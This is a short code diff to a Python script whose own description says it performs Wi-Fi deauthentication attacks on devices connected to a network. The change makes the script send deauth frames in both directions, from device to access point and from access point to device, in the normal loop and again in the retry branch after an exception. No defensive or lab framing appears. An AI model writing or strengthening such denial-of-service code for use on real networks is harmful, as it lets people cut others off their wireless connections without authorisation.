@@ -33,10 +33,12 @@ def run_deauth_attacks(maccy, interface, packet_count, interval):
             for device in maccy:
                 try:
                     executor.submit(deauth, device, wifi, interface, packet_count, interval)
+                    executor.submit(deauth, wifi, device, interface, packet_count, interval)
                 except Exception as e:
                     print(f"Exception occurred: {e}")
                     time.sleep(60)
                     executor.submit(deauth, device, wifi, interface, packet_count, interval)
+                    executor.submit(deauth, wifi, device, interface, packet_count, interval)
 
 def main():
     parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
